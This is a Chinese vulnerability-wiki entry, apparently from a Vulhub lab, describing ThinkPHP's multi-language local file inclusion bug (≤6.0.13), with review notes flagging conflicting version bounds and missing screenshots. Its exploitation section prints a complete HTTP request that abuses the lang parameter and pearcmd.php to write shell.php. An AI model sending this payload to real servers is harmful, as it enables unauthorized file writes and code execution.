---
version: ""
source: "Threekiii/Vulnerability-Wiki"
product: "ThinkPHP / 多语言本地文件包含"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
version_notes: "docker-compose up -d"
title: "ThinkPHP-多语言本地文件包含漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：称<=6.0.13，实验6.0.12；多语言非默认，PEAR+argv条件明确"
side_effects: "未执行；本文需注意的操作影响：边界待核：≤6.0.13 与同库 &lt;6.0.13 冲突，需补丁提交/发行构建核对，不能自行选一个符号。pearcmd 写入还需可达包含入口、PEAR 文件及 SAPI 参数配置；HTTP 500 不能唯一证明包含或代码执行。"
source_status: "unknown"
id: "vw-c4c5cd1f3a6406321bc133f6"
entity_id: "ve-c4c5cd1f3a6406321bc133f6"
schema_version: "1"
---

## 核对与使用边界

- 边界待核：≤6.0.13 与同库 &lt;6.0.13 冲突，需补丁提交/发行构建核对，不能自行选一个符号。pearcmd 写入还需可达包含入口、PEAR 文件及 SAPI 参数配置；HTTP 500 不能唯一证明包含或代码执行。

- 明确更正：原 version 字段抽入命令、源码、路径、配置或普通叙述，不是版本号，已清空机器版本字段并原样保留于 version_notes；实际版本/分支条件见本节逐篇记录，未从代码猜造版本。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：称&lt;=6.0.13，实验6.0.12；多语言非默认，PEAR+argv条件明确

代码与实验材料：有完整pearcmd写phpinfo请求，无前置包含URL和结果截图；500不能唯一证明

来源证据范围：有tttang及leavesongs原始研究链接

- **证据待核（1）**：检测500过于宽松；依据：称包含public/index.php返回500则漏洞存在，未给对照或独立包含证据。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（2）**：版本字段和边界错误风险；依据：version为docker-compose up -d；&lt;=6.0.13与508&lt;6.0.13冲突。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（3）**：证据缺失和环境泛化；依据：多个应有图位置空白，Docker默认PHP满足条件需限定镜像标签和配置。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ThinkPHP 多语言本地文件包含漏洞

## 漏洞描述

ThinkPHP 是一个在中国使用较多的 PHP 框架。在其 6.0.13 版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用 `lang` 参数来包含任意 PHP 文件。

虽然只能包含本地 PHP 文件，但在开启了 `register_argc_argv` 且安装了 pcel/pear 的环境下，可以包含 `/usr/local/lib/php/pearcmd.php` 并写入任意文件。

参考链接：

- <https://tttang.com/archive/1865/>
- <https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp> （本文介绍了 `pearcmd.php` 利用技巧的原理）

## 环境搭建

Vulhub 执行如下命令启动一个使用 ThinkPHP 6.0.12 版本开发的 Web 应用：

```
docker-compose up -d
```

环境启动后，访问 `http://your-ip:8080` 即可查看到 ThinkPHP 默认的欢迎页面。




## 漏洞利用

首先，ThinkPHP 多语言特性不是默认开启的，所以我们可以尝试包含 `public/index.php` 文件来确认文件包含漏洞是否存在：




如果漏洞存在，则服务器会出错，返回 500 页面。

文件包含漏洞存在的情况下还需要服务器满足下面两个条件才能利用：

1. PHP 环境开启了 `register_argc_argv`
2. PHP 环境安装了 pcel/pear

Docker 默认的 PHP 环境恰好满足上述条件，所以我们可以直接使用下面这个数据包来在写 `shell.php` 文件：

```
GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Connection: close
Cache-Control: max-age=0
```

如果服务器返回 pearcmd 的命令行执行结果，说明漏洞利用成功：




此时访问 `http://your-ip:8080/shell.php` 即可发现已经成功写入文件：




---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
